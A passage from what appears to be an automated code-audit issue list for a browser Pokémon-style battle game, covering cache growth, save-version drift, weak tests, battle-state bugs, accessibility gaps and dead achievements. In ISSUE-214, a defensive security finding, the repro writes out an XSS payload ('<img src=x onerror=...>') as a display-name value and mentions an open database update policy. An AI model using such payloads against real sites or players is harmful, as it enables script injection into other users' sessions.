---

**Title**: `_trainerPoolCache` is an unbounded Map (keyed on type+gens) with no eviction — Fight Club draft / story-pool variety will grow it without limit

**Evidence**:
```js
// battle.html:33916 — module-level, never cleared
const _trainerPoolCache = new Map();
// rollTrainerTeam builds T={1,2,3,4} partitions over ~1380 species per novel key:
//   const _poolKey = (isMixed?'mixed':types.sort().join('+')) + '|' + gensSorted.join(',');
//   let T = _trainerPoolCache.get(_poolKey); if (!T) { ...full baseStats scan...; _trainerPoolCache.set(_poolKey, T); }
```
Measured (jsdom, `--expose-gc`): rolling 30 trainer types × 511 distinct gen-subset combos (15,330 calls → up to ~15k distinct keys) grew heap +13.4 MB and the cache is never freed. Each entry is a 4-bucket partition of up to ~1380 species names.

**Repro**: `node --expose-gc` driving `window.__storyTest.rollTrainerTeam(trainer, 6, gw, gensSubset, 'Basic Trainer', 20)` across many (type, gens) pairs; heap climbs monotonically with distinct-key count.

**Blast radius**: Today the active-gens list is fixed per run, so only ~38 type-themes × 1 gen-combo are ever keyed → cache is tiny and warm rolls are fast (median **0.34 ms**, cold cache-miss **0.84 ms**, max 1.68 ms — both far under the 50 ms target). The risk is the planned **Fight Club gauntlet + expanded story-pool**: if those call `rollTrainerTeam` with varied gen filters / synthetic trainer types per draft, distinct keys multiply and the Map grows unbounded across a long session. This is the "won't scale with new systems" flag, not a current regression.

**Fix sketch**: Bound `_trainerPoolCache` with a small LRU (e.g. 64 entries) or clear it on run-start / gen-setting change. The partition is cheap to rebuild (cold miss is < 1 ms), so eviction costs nothing perceptible.

**Verification**: After bounding, drive 15k+ distinct-key rolls and confirm `_trainerPoolCache.size` plateaus at the cap and heap delta stays flat.

---

## <a id="ISSUE-206"></a> ISSUE-206: Safari unlock spec'd "after badge 3 OR City3" but code (and REDESIGN) fix it firmly at City4

---
id: ISSUE-206
severity: P2
category: inconsistency
anchor_symbol: SAFARI_ENTRY_COST
current_line_hint: ~43148
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 43572c0f06d7
confidence: high
status: open
---

**Title**: Safari unlock spec'd "after badge 3 OR City3" but code (and REDESIGN) fix it firmly at City4

**Evidence**:
```js
// SPEC (STORY_FEATURES_INTEGRATION §4): "From run itinerary ... e.g. after badge 3 or City3 segment"
// CODE (battle.html ~43148):
//   "// v19 stage-gated Safari curve. Safari unlocks at City 4 (badges 3),"
// STORY_EVENTS_RAW row 22 = City4 actions include 'Safari Zone'; no City3 row offers it.
```

**Repro**: `grep -niE "safari" battle.html | grep -iE "City 4|badges 3"` shows the City4 anchor; no City3 Safari action exists in STORY_EVENTS_RAW. The shipped spec's "or City3 segment" alternative is contradicted by code.

**Blast radius**: Small — single ambiguous clause. But it is the kind of "decision never made" wording (cf. §7 Trader "idx 26 OR 29") that misleads a reader about where the gate lives. REDESIGN_PLAN §2 correctly states C4; the *shipped* spec is the stale one.

**Fix sketch**: Strike "or City3 segment" from STORY_FEATURES_INTEGRATION §4; state City4 / 3-badge debut to match code and REDESIGN. (Doc owner's edit — read-only audit.)

**Verification**: §4 reads a single unambiguous trigger matching STORY_EVENTS_RAW row 22.

---

## <a id="ISSUE-207"></a> ISSUE-207: safari-zone integration test gives false confidence — asserts stale hard-coded weights and matches "1.25" anywhere in the spec doc

---
id: ISSUE-207
severity: P2
category: dx
anchor_symbol: safari-zone.test
current_line_hint: tests/integration/safari-zone.test.js ~10
file: tests/integration/safari-zone.test.js
agents: [story-mode-investigator]
fingerprint: c05411e4ccb3
confidence: high
status: open
---

**Title**: safari-zone integration test gives false confidence — asserts stale hard-coded weights and matches "1.25" anywhere in the spec doc

**Evidence**: Two hollow assertions:
```js
test('safari-zone: grade weights g1:3 / g2:22 / g3:50 / g4:25 sum to 100', () => {
  const weights = { g1: 3, g2: 22, g3: 50, g4: 25 };   // hard-coded LITERAL, not from engine
  assert.equal(sum, 100, ...);                          // only checks 3+22+50+25===100
});
test('safari-zone: catch math 1.25× multiplier is documented', () => {
  const matches = flow.match(/1\.25/g);                 // matches "1.25" ANYWHERE in 74KB spec
  assert.ok(matches && matches.length > 0, ...);
});
```
Neither reads the engine. The live weights are `_SAFARI_GRADE_CURVE_BY_BADGES` (badge-keyed; the static `{3,22,50,25}` is the deleted pre-v19 value). The live multiplier is `SAFARI_BALL_MULT = 1.35` and the spec confirms 1.35 — but the test asserts "1.25", which only passes because that substring appears on an UNRELATED Frontier line (STORY_MODE_FLOW.md ~735 "1.25 + 0.045/r"). The test would still pass if `SAFARI_BALL_MULT` were changed to any value.

**Repro**: `node --test tests/integration/safari-zone.test.js` (passes), then compare against `battle.html` `_SAFARI_GRADE_CURVE_BY_BADGES` (~43547) and `SAFARI_BALL_MULT` (~44314).

**Blast radius**: Test tooling. The safari weights/multiplier have no real regression coverage; the run-engine-test SKILL advertises this file as covering "weights" but it does not.

**Fix sketch**: Read the actual constants from the loaded engine (expose `_SAFARI_GRADE_CURVE_BY_BADGES` / `SAFARI_BALL_MULT` via the test harness or `window`) and assert the shipped values; tighten the multiplier check to read `SAFARI_BALL_MULT` rather than substring-matching the spec doc.

**Verification**: Mutate `SAFARI_BALL_MULT` to 1.40 in a scratch copy — the fixed test must fail.

---

## <a id="ISSUE-208"></a> ISSUE-208: STORY_MODE_FLOW pins SAVE_VER at 15/17; shipped SAVE_VER is 21

---
id: ISSUE-208
severity: P2
category: inconsistency
anchor_symbol: SAVE_VER
current_line_hint: ~31502
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: fad1a278acb4
confidence: high
status: open
---

**Title**: STORY_MODE_FLOW pins SAVE_VER at 15/17; shipped SAVE_VER is 21

**Evidence**:
```js
// battle.html:31502
const SAVE_VER = 21;
// migrations present & dispatched in load(): preV11..preV17, preV18 (diacritics),
// preV19, preV20, preV21 — no gaps.
```
```text
STORY_MODE_FLOW.md:279  "Bump `SAVE_VER` from 14 to 15. Add:"
STORY_MODE_FLOW.md:352  "- Bump `SAVE_VER` to 15."
STORY_MODE_FLOW.md:1176 "- `SAVE_VER` bumped 16 → 17."
```

**Repro**: `grep -nE 'SAVE_VER\s*=' battle.html` → `SAVE_VER = 21`.

**Blast radius**: Doc-only. These are milestone-history statements (M0 = v15, v17 registry, etc.), so they are not strictly "wrong" as historical notes — but a reader treating `STORY_MODE_FLOW.md` as the canonical current spec will assume v15/v17 is current. The `migrateStoryPreV15` body itself MATCHES spec §10 exactly (pcBox/balls/pokedex/catchUnlocked defaults, hardcore→normal, stable ids — verified line-by-line at battle.html:32153-32179), so check #3 (migration completeness) passes; only the *version number* the spec implies as "current" is stale. Note there is no `migrateStoryPreV18` by that literal name, but `migrateStoryTrainerDiacriticsPreV18` covers the `<18` slot (battle.html:32606) — not a gap.

**Fix sketch**: Add a one-line "current SAVE_VER is 21" note at the top of §10/§13, or annotate each bump as the milestone it shipped in, so the doc reads as layered history rather than current state.

**Verification**: Spec's stated current SAVE_VER equals `battle.html` `SAVE_VER`.

---

## <a id="ISSUE-209"></a> ISSUE-209: SAVE_VER stays at 19 despite an implicit v20 schema cleanup that runs on every load

---
id: ISSUE-209
severity: P2
category: dx
anchor_symbol: SAVE_VER
current_line_hint: ~29995
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1877fb707d44
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: SAVE_VER stays at 19 despite an implicit v20 schema cleanup that runs on every load

**Evidence**:
```js
// battle.html ~29995
const SAVE_VER = 19;

// battle.html ~30896 (inside load(), runs every load regardless of version)
// v20: casino runs on gold directly. Drop the legacy coin
// currency silently from old saves.
try { delete sm.casinoCoins; } catch (e) {}
if (!sm.casinoStats || typeof sm.casinoStats !== 'object') sm.casinoStats = {};
try { delete sm.casinoStats.cashier; } catch (e) {}
try { delete sm.profIntroThemePending; } catch (e) {}
// ...
// And around 30919:
try { delete sm.deferredEarlyRivalPos; } catch (e) {}
```

The "v20" cleanup runs unconditionally on every load — it's not gated by `_loadedVer < 20`, and `SAVE_VER` was never bumped. So:
- A pristine v20 schema doesn't exist (no version bump means new saves stamp version=19).
- The implicit migration runs forever on every load, wasting cycles (cheap, but unbounded).
- Any future v20 changes that require a real migration will have no clean way to identify "loaded from pre-v20 vs already-cleaned".

**Repro**: `localStorage.getItem('pbs_story_save')` → look for `casinoCoins` key. It's never persisted post-load. The cleanup is idempotent, so it doesn't break anything; it just makes "v20" a phantom version.

**Blast radius**: DX/maintainability. A future contributor adding a real v20 migration needs to retrofit a `_loadedVer < 20` block and bump SAVE_VER. Meanwhile, the unconditional `delete` calls are silent enough that nobody notices the absence of an explicit `_loadedVer < 20` block.

**Fix sketch**: Wrap the four delete calls in `if (_loadedVer < 20) { ... }`, bump `SAVE_VER = 20`, and add a one-line `migrateStoryPreV20()` (or rename the cleanup to be the canonical migration). Mirrors the explicit pattern used for v15-v19.

**Verification**: After fix, `_loadedVer === 20` saves skip the delete pass. Symbol-index lookup `--lookup migrateStoryPreV20` resolves cleanly.

---

## <a id="ISSUE-210"></a> ISSUE-210: SAVE_VER=23 but migration chain stops at PreV22 — no migrateStoryPreV23 step (v23 added wanderByEventIdx, back-filled unconditionally)

---
id: ISSUE-210
severity: P2
category: dx
anchor_symbol: SAVE_VER
current_line_hint: ~34578
file: battle.html
agents: [story-mode-investigator]
fingerprint: e8bc3184fc4b
confidence: high
status: open
---

**Title**: SAVE_VER=23 but migration chain stops at PreV22 — no migrateStoryPreV23 step (v23 added wanderByEventIdx, back-filled unconditionally)

**Evidence**:
```js
// v23 (Wander Around) only ADDED sm.wanderByEventIdx ... so it intentionally
// has no migrateStoryPreV23 ... The chain's last versioned step is migrateStoryPreV22.
const SAVE_VER = 23;
// load(): last versioned migrate is `if (_loadedVer < 22) migrateStoryPreV22()`.
```

**Repro**: `grep migrateStoryPreV23 battle.html` → 0. `wanderByEventIdx` is seeded by an unconditional back-fill (`@35640`), so a v22 save loads clean — but the bump-without-step is undocumented in the version-gated chain itself.

**Blast radius**: Benign today (additive field, idempotent back-fill, round-trip verified clean v14→v23). But the pattern (bump SAVE_VER, rely on an unconditional back-fill instead of a gated step) recurs — see ISSUE-176 (v19→v20 cleanup), and the v20-cleanup that reads `d.version` directly (`@35670`). It makes the chain hard to audit: the gated ladder no longer tells the full story of what each version changed. The comment is the only record.

**Fix sketch**: Either add a no-op/documenting `if (_loadedVer < 23) { /* wanderByEventIdx back-filled below */ }` gate for symmetry, OR add a boot-time shadow-validation (ISSUE-140) that asserts every field in `sm` defaults is present after a synthetic round-trip from each historical version. Low priority; the round-trip is currently correct.

**Verification**: A v22 save loads to a v23 sm with `wanderByEventIdx` present and no field gaps.

---

## <a id="ISSUE-211"></a> ISSUE-211: Pending Healing Wish / Lunar Dance flags bleed into next battle and auto-heal its lead

---
id: ISSUE-211
severity: P2
category: bug
anchor_symbol: selectPartyMember
current_line_hint: ~20672
file: battle.html
agents: [battle-engine-debugger]
fingerprint: bfdd6b8592a2
confidence: high
status: open
---

**Title**: Pending Healing Wish / Lunar Dance flags bleed into next battle and auto-heal its lead

**Evidence**:
```js
if (isP1 && state._healingWish) {
    state[activeTarget].currentHp = state[activeTarget].maxHp; state[activeTarget].status = null; state[activeTarget].statusTurns = 0;
    if (state._lunarDance) { state[activeTarget].moves.forEach(mv => { mv.pp = mv.maxPp || mv.pp; }); state._lunarDance = false; }
    state._healingWish = false; logMsg(`${state[activeTarget].name} was fully restored!`, 'heal');
}
```
`state._healingWish` / `_healingWishFoe` / `_lunarDance` / `_lunarDanceFoe` are set when the move resolves (26714/26716) and cleared ONLY when a replacement switches in (20672-20680). If the battle ends with the flag still pending (the Healing-Wish user faints as the last mon, or a forced/early battle end occurs before a replacement enters), the flag survives on the persistent `state` — startBattle's reset block does not list it. The next battle's first switch-in (incl. the lead via the same code path) then gets a free full HP + status clear (+ full PP for Lunar Dance).

**Repro**: `node scripts/debug/_repro/healingwish-bleed.mjs` — set `state._healingWish = state._lunarDance = true`, call startBattle() for fight 2, assert still true: "HEALING-WISH BLEED: YES". jsdom, seed 0.

**Blast radius**: Lower frequency than the boss bleed (requires a pending Healing Wish/Lunar Dance at battle end), but a concrete "mechanic continued in the next fight" — gives the next lead an undeserved full heal. `state._fTeraReserveLogged` (19981) bleeds the same way but is only a cosmetic log-once dedupe (suppresses one foe-tera-reserve log line next fight).

**Fix sketch**: In startBattle's reset block, clear `state._healingWish = state._healingWishFoe = state._lunarDance = state._lunarDanceFoe = false; state._fTeraReserveLogged = false;` (same place as the proposed boss-field reset).

**Verification**: Re-run the repro; flags must be false after startBattle. Manually: finish a battle on a Healing-Wish faint, enter the next — its lead must NOT be auto-restored.

---

## <a id="ISSUE-212"></a> ISSUE-212: sellItem trusts caller-supplied sellPrice instead of re-deriving from the catalog

---
id: ISSUE-212
severity: P2
category: bug
anchor_symbol: sellItem
current_line_hint: ~52759
file: battle.html
agents: [story-mode-investigator]
fingerprint: fe7148ad7ab0
confidence: medium
status: open
---

**Title**: sellItem trusts caller-supplied sellPrice instead of re-deriving from the catalog

**Evidence**:
```js
function sellItem(itemId, sellPrice) {
    if (!sm.inventory[itemId] || sm.inventory[itemId] <= 0) return;
    if (PERM_BOOST_IDS.has(itemId)) return;
    sm.inventory[itemId]--;
    sm.gold += sellPrice;   // credited verbatim, never validated
```

**Repro**: A DOM-edited onclick (or future caller) can pass an arbitrary sellPrice and credit unlimited gold. buyItem re-validates price vs catalog; sellItem does not — asymmetric trust.

**Blast radius**: Gold accounting integrity.

**Fix sketch**: In sellItem, look up the row in [...POKEMART_ITEMS, ...DEPT_ITEMS, ...getStoryFeaturedItems()], recompute Math.floor(row.price/2) server-side, ignore the passed arg.

**Verification**: StoryMode.sellItem('potion', 999999) → gold rises only by catalog-derived value.

---

## <a id="ISSUE-213"></a> ISSUE-213: 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging

---
id: ISSUE-213
severity: P2
category: dx
anchor_symbol: setBattleLogHtml
current_line_hint: ~230
file: online-pvp.js
agents: [consistency-auditor]
fingerprint: e261b55d36c1
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging

**Evidence**:
```js
// L230  } catch (e) {}                                          (setBattleLogHtml DOM access)
// L417  try { sb.removeChannel(channel); } catch (e) {}         (_subscribe)
// L435  try { sb.removeChannel(channel); } catch (e) {}         (dispose)
// L460  } catch (e) {}                                          (reset state vars)
// L553  try { global.syncBattleActiveHighlight(); } catch (e) {}
// L760  try { global.AudioSystem.startNewBattle(); } catch (e) {}
// L775/L797 — same shape
```

**Repro**: A subscription failure, DOM-detached state, or missing global helper silently no-ops. Debug becomes "look at all eight catches manually".

**Blast radius**: Diagnostic blind spots only — no runtime bug, but a real "what just happened?" cost when investigating PvP issues in the field.

**Fix sketch**: Replace each `catch (e) {}` with `catch (e) { console.debug('[OnlinePvP] <site> swallowed', e); }`. Some sites can stay silent (the `sb.removeChannel` cleanup is genuinely best-effort) — document those with `/* best-effort */` instead of empty.

**Verification**: After a known-failure scenario (e.g., disconnect mid-battle), check the console for diagnostic breadcrumbs.

---

## <a id="ISSUE-214"></a> ISSUE-214: Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS

---
id: ISSUE-214
severity: P2
category: security
anchor_symbol: setDisplayName
current_line_hint: ~812
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 89314480e594
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS

**Evidence**:
```js
// online-pvp.js L812-814
setDisplayName(n) {
    global.localStorage.setItem(STORAGE_KEY, String(n || '').trim().slice(0, 24) || 'Trainer');
}
// L723 host pushes the unsanitized name back to room data:
host_display_name: nPrev.host_display_name || (global.localStorage && global.localStorage.getItem('pbs_online_display_name')) || 'Host',
// battle.html L14695-14696 — guest stores remote name on globals
if (d.host_display_name) window.__onlineHostName = d.host_display_name;
if (d.guest_display_name) window.__onlineGuestName = d.guest_display_name;
// battle.html L16285-16286, L791-794 — currently safe (innerText), but each new call site is a foot-gun
if (title.includes('VICTORY')) document.getElementById('end-desc').innerText = `${p1n} won this round!`;
```

**Repro**: Set localStorage `pbs_online_display_name = '<img src=x onerror=alert(1)>'.slice(0, 24)` → `'<img src=x onerror=ale'` (truncated but the `<img` still parses). Currently only `innerText` consumers exist, so the live attack surface is zero. But there are 6+ globals (`__onlineHostName`, `__onlineGuestName`, etc.) holding raw player-controlled strings, and any future panel that does `el.innerHTML = ${name} won!` opens the door.

**Blast radius**: Latent — depends on future innerHTML callsites touching display names. Compounded by the open-RLS finding above: an attacker doesn't even need to log in; they can directly write `host_display_name` to any live room via the open UPDATE policy.

**Fix sketch**: In `setDisplayName`, strip HTML-sensitive chars: `String(n || '').trim().replace(/[<>"'&]/g, '').slice(0, 24) || 'Trainer'`. Reject control characters too. Belt-and-suspenders: every consumer should use textContent/innerText only. Add an ESLint rule (or a grep test in CI) that fails if a line both touches `__onlineHostName`/`__onlineGuestName` and contains `innerHTML`.

**Verification**: Set the localStorage key to `'<script>x</script>'`, start a match, eyeball the score panel — it should display the literal characters (or empty), not execute.

---

## <a id="ISSUE-215"></a> ISSUE-215: settings.animations defaults to true and is never seeded from prefers-reduced-motion

---
id: ISSUE-215
severity: P2
category: a11y
anchor_symbol: settings-animations-init
current_line_hint: ~10824
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 9d6f7493af32
confidence: high
status: open
---

**Title**: settings.animations defaults to true and is never seeded from prefers-reduced-motion

**Evidence**:
```js
let settings = { animations: true, musicEnabled: true, soundEnabled: true,
    weatherAnimation: true, terrainBackground: true, /* ...no reduced-motion sync... */ };
```

**Repro**: A user whose OS requests reduced motion still boots with `animations:true` and gets full battle FX, screen-shake, and gimmick (Mega/Dynamax/Tera) sequences until they manually find Settings → "Battle animations" and toggle it off. The preference is honored for screen transitions (L9204) but the master visual-FX switch ignores it on first load.

**Blast radius**: All FX gated on `settings.animations` (~25 call-sites: move FX, faint fades L20265/20284, hit-flash L21087, gimmick anims L14480+, weather). Pairs with the `showMoveEffect` finding — fixing either reduces harm, but seeding the setting fixes them all at once.

**Fix sketch**: On settings init (when no persisted value exists), seed `animations`/`weatherAnimation` from `!matchMedia('(prefers-reduced-motion: reduce)').matches`, and reflect that in the `#sw-animations` switch state. Optionally listen for changes to the media query.

**Verification**: Fresh profile + OS reduce-motion on → "Battle animations" switch is OFF by default and FX are suppressed.

---

## <a id="ISSUE-216"></a> ISSUE-216: Anomaly seeds fire via low-z `showGameAlert` on the same tick as the row's flow — can paint behind/over other overlays

---
id: ISSUE-216
severity: P2
category: inconsistency
anchor_symbol: showGameAlert
current_line_hint: ~42319
file: battle.html
agents: [story-mode-investigator]
fingerprint: f31bcfda964b
confidence: medium
status: open
---

**Title**: Anomaly seeds fire via low-z `showGameAlert` on the same tick as the row's flow — can paint behind/over other overlays

**Evidence**:
```js
// processNextEvent: try { _tryFireAnomalySeed(ev); } catch(e){}   // does NOT early-return
// _tryFireAnomalySeed: window.showGameAlert(seed);   // modal alert, lower z than 9998/9999 overlays
// Then the SAME tick proceeds to _tryFireRoadStoryBeats / enterBattleEvent (which may open a z9998 overlay).
```

**Repro**: Rows 7/14/30/49 carry anomaly seeds. At row 7 (a road1 Basic Trainer), `_tryFireAnomalySeed` shows a `showGameAlert`, then flow continues to enterBattleEvent (cold-open / beat / VS splash at z9998-9999). The seed alert and the subsequent overlay are not coordinated — the seed can be obscured by, or sit oddly alongside, the battle-entry overlay.

**Blast radius**: The 4 anomaly seeds (the deliberate "The First" breadcrumbs). They're meant to be quietly noticed; firing them on the same tick as a battle-entry overlay risks them being missed or overlapped — undercutting the slow-burn payoff that mfReveal pays off.

**Fix sketch**: Route anomaly seeds through the unified presentation registry (above) with a defined layer + sequencing relative to the row's other scenes, or fire them on city-arrival/exit rather than the battle-entry tick.

**Verification**: An anomaly-seed row shows the seed cleanly, sequenced before/after the battle-entry overlay, never overlapping.

---

## <a id="ISSUE-217"></a> ISSUE-217: showGameConfirm overwrites a pending _gameConfirmResolve, orphaning the first awaiter

---
id: ISSUE-217
severity: P2
category: bug
anchor_symbol: showGameConfirm
current_line_hint: ~13763
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7ef723c1942f
confidence: medium
status: open
---

**Title**: showGameConfirm overwrites a pending _gameConfirmResolve, orphaning the first awaiter

**Evidence**:
```js
window.showGameConfirm = function(message) {
    return new Promise(function(resolve) {
        window._gameConfirmResolve = resolve;   // clobbers any prior pending resolve
        ...
    });
};
```

**Repro**: Two overlapping confirm-gated commerce actions (see buyArtifact/buyItem missing-lock findings): the second clobbers _gameConfirmResolve; the first Promise never resolves and its await hangs (that purchase silently aborts mid-flow). _storyTryBeginInteraction guards via the _gameConfirmResolve check, but commerce buy paths don't call it.

**Blast radius**: Any two async confirm consumers not both behind the interaction lock. The "one confirm in flight" invariant is enforced by convention, not by showGameConfirm.

**Fix sketch**: Make showGameConfirm defensive — if _gameConfirmResolve already set, settle the prior promise (resolve(false)) before reassigning. Belt-and-suspenders alongside locking the buy paths.

**Verification**: Call showGameConfirm twice without resolving the first → first settles to false rather than hanging.

---

## <a id="ISSUE-218"></a> ISSUE-218: anime.js move-FX engine ignores prefers-reduced-motion — heaviest motion bypasses the CSS catch-all

---
id: ISSUE-218
severity: P2
category: a11y
anchor_symbol: showMoveEffect
current_line_hint: ~12598
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 961c3460c828
confidence: high
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: anime.js move-FX engine ignores prefers-reduced-motion — heaviest motion bypasses the CSS catch-all

**Evidence**:
```js
function showMoveEffect(moveName, type, cat, isPlayerTarget) {
    if (!settings.animations) return;   // ONLY gate — no prefers-reduced-motion check
    // ...dispatches typeAnims[t](container, colors): particle bursts, beams,
    //    physical-impact lunges via anime({...}) (RAF inline-style interpolation)
```

**Repro**: OS "Reduce motion" ON, in-game Battle-animations toggle left ON (default). Use any move — full particle storm, beam, lunge and hit-flash still play. The global CSS guard at L6694 (`*{animation-duration:1ms}`) only neutralizes CSS keyframes/transitions; anime.js drives inline styles via requestAnimationFrame, so it is unaffected. `runScreenTransition` (L9204) already checks `matchMedia('(prefers-reduced-motion: reduce)')`, proving the pattern is known — the FX engine just omits it.

**Blast radius**: Every attack in every battle (Story/PvE/PvP/Gauntlet) routes through `showMoveEffect` → `MoveAnimEngine`; also `renderPerMoveAnim`, `playPhysicalImpact`, `playSpecialBeam`. This is the single most motion-intense subsystem in the game.

**Fix sketch**: At the top of `showMoveEffect` (and the gimmick-anim helpers), early-return or hard-cut durations when `matchMedia('(prefers-reduced-motion: reduce)').matches` — keep the damage/log outcome, drop the visual storm.

**Verification**: With OS reduce-motion on, moves resolve instantly (no particles/lunge) while the battle log still narrates the hit.

---

## <a id="ISSUE-219"></a> ISSUE-219: Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored

---
id: ISSUE-219
severity: P2
category: a11y
anchor_symbol: showVictoryOverlay
current_line_hint: ~38410
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 7196d6421a81
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored

**Evidence**:
```js
// showVictoryOverlay at ~38410
const ov = document.createElement('div');
ov.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:9999;…';
const contBtn = document.createElement('button');
contBtn.textContent = 'Continue →';
…
const autoClose = setTimeout(dismiss, 6000);
contBtn.onclick = (e) => { e.stopPropagation(); dismiss(); };
…
ov.onclick = () => dismiss();
document.body.appendChild(ov);
```

The post-battle victory overlay is the highest-pomp moment of the run (badges, gold, mystery reveals, "First time ever" banner). It's a fullscreen layer with no `role="dialog"`, no `aria-modal`, no `aria-labelledby` on "VICTORY!", no `Escape`/`Enter` to dismiss before the 6 s autoclose, no focus on `Continue →`. SR users hear nothing announce. Sighted keyboard users can't dismiss early without finding the button with Tab.

**Repro**: Win any story battle → overlay opens. Hit Esc/Enter → nothing. Hit Tab → focus may or may not land on Continue (depends on prior focus).

**Blast radius**: Every story victory, every gym clear, every Elite/Champion celebration. Combined with the tutorial dialog gap (sibling finding), the highest-emotion story beats are also the least accessible.

**Fix sketch**: Same pattern as tutorial: `role="dialog"`, `aria-modal="true"`, label by the VICTORY heading, autofocus `contBtn` next frame, add Esc/Enter keydown that calls `dismiss()`. Keep the auto-close.

**Verification**: Esc after victory closes the overlay; SR announces "VICTORY!, dialog" on open.

---

## <a id="ISSUE-220"></a> ISSUE-220: Fresh run starts with 0 Poké Balls; skipping the optional City-0 Mart silently no-ops the catch tutorial

---
id: ISSUE-220
severity: P2
category: bug
anchor_symbol: startNewRun
current_line_hint: ~39514
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 03906b358d2f
confidence: high
status: open
---

**Title**: Fresh run starts with 0 Poké Balls; skipping the optional City-0 Mart silently no-ops the catch tutorial

**Evidence**:
```js
// startNewRun() fresh sm object literal (39462+): NO starter-ball grant.
balls: { poke: 0, great: 0, ultra: 0, master: 0 },   // 39514 — fresh run
// The ONLY fresh-run ball source is the OPTIONAL first-Mart visit:
firstMart.onContinue: _storyGrantBundle({ pokeBall: 5 });   // 40703
// Catch-tutorial gate hard-fails on 0 balls:
const totalBalls = (balls.poke|0)+(balls.great|0)+(balls.ultra|0)+(balls.master|0);
if (totalBalls <= 0) return false;   // 46943-46944 _shouldFireCatchTutorialBeforeBattle
```
The "starting kit gives 5 … which the starting kit guarantees" comments at 46924/46940 are FALSE for a fresh run — that 5-ball stock is granted only by `migrateStoryPreV15` (35260, pre-v15 *existing* saves) or the optional `firstMart` tutorial. `startNewRun` itself (39441) seeds `poke:0` (39514) with no unconditional grant. The City-0 Pokémart is a player-clicked city action (`enterShop('mart')`, 51416), not a forced beat, so a player can reach the post-intro-rival catch tutorial with `totalBalls === 0`. The interrupt's `prepare` (42028-42029) then returns `null` and the scripted tutorial wild (which is "wild #1 of the intro route node", 42023-42027) silently never fires.

**Repro**: `node scripts/debug/_repro/catch-tut-zeroballs.mjs` (jsdom). With fresh `balls.poke=0`: "Catch-tutorial ball gate (needs >0): BLOCKED (tutorial no-ops)". After the firstMart 5-ball gift: "gate PASSES". Manual: New Game → walk straight past the City-0 Mart → beat the intro rival → the catch tutorial does not play.

**Blast radius**: Story onboarding only (not a hard soft-lock). `_markCatchTutorialDone` is NOT called on the blocked path (mark-done fires only on actual catch success, 51111-51116), so `sm.catchTutorialDone` stays false and the gate re-tries on every later Battle row — it self-heals the moment the player acquires any ball (a later Mart visit, a reward bundle, etc.). The cost is (a) the player loses the scripted free Grade-4 partner catch and the guaranteed 2nd party mon for the early route/Gym-1 number-floor (the stated design goal at 46915-46917), and (b) the in-fiction "starting kit guarantees a ball" contract is violated. The scripted `chainAfter` wild #1 also doesn't fire, shifting the intro route's wild cadence.

**Fix sketch**: Either grant the starter balls unconditionally in `startNewRun` (seed `balls:{poke:5,…}` at 39514, matching the v15 migration and the comment's promise), OR make the City-0 first-Mart visit a forced beat before the first wild route. Option A is the smaller, lower-risk change and makes the 46924/46940 comments true. Coordinate the schema/balance touch with the maintainer (ball counts are user-owned per CLAUDE.md).

**Verification**: Re-run the repro after the fix — fresh-run total must be > 0 and the gate must PASS without a Mart visit. Manual: New Game → skip Mart → intro rival → catch tutorial fires.

---

## <a id="ISSUE-221"></a> ISSUE-221: Achievements `caged_god` / `r_caged_god` are permanently unobtainable (dead arc)

---
id: ISSUE-221
severity: P2
category: inconsistency
anchor_symbol: STORY_ACHIEVEMENTS
current_line_hint: ~34767
file: battle.html
agents: [consistency-auditor]
fingerprint: 3c5313751854
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Achievements `caged_god` / `r_caged_god` are permanently unobtainable (dead arc)

**Evidence**:
```js
{ id: 'caged_god',   cat:'milestone', name:'The Caged God', desc:'Capture Subject Zero in the post-game boss arc.', icon:'🔮' },
{ id: 'r_caged_god', cat:'replay',    name:'Caged God',     desc:'Complete the Caged God post-game boss arc.',       icon:'🔮' },
// Only unlock site (~50903) is inside the unreachable bossEnterCage win path:
//   if (bossMode) { _storyAchievementUnlock('caged_god'); _storyAchievementUnlock('r_caged_god'); }
```

**Repro**: Open the achievements screen post-game — two 🔮 entries can never be completed because their only grant path is the dead Caged-God battle resolution.

**Blast radius**: 100%-completion players see permanently-locked achievements with no in-game path. Also the intro/help copy at ~11337 and ~11360 still describes the Caged God + Master Ball quest as a live feature.

**Fix sketch**: Remove both achievement rows (and the dangling help-screen Caged-God copy) if the arc stays cut, or restore the trigger if it's revived. Keep in sync with the P2 above.

**Verification**: Achievements list contains no unobtainable entries; help text matches shipped post-game.

---

## <a id="ISSUE-222"></a> ISSUE-222: Caged God achievements (caged_god, r_caged_god) are permanently unearnable after v24 arc cut

---
id: ISSUE-222
severity: P2
category: inconsistency
anchor_symbol: STORY_ACHIEVEMENTS
current_line_hint: ~34815
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 84f5dd4f7ed4
confidence: high
status: fixed-claude/gracious-goodall-QFuQF
---

**Title**: Caged God achievements (caged_god, r_caged_god) are permanently unearnable after v24 arc cut

**Evidence**:
```js
// battle.html:34815 / 34845 — still listed & rendered in the achievement screen:
{ id: 'caged_god',   cat:'milestone', name:'The Caged God', desc:'Capture Subject Zero in the post-game boss arc.', icon:'🔮' },
{ id: 'r_caged_god', cat:'replay',    name:'Caged God',     desc:'Complete the Caged God post-game boss arc.', icon:'🔮' },
// battle.html:50982 — the ONLY grant, gated on bossMode (boss-arc catch path):
